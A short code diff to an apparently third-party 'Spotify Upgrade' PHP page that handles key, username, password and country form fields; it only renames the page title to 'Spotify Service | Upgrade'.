@@ -38,7 +38,7 @@ if (isset($_POST["key"], $_POST["usr"], $_POST["pwd"], $_POST["country"])) {
 <!DOCTYPE html>
 <html lang="zxx">
    <head>
-      <title>Spotify Upgrade | Upgrade</title>
+      <title>Spotify Service | Upgrade</title>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <!-- Favicon -->
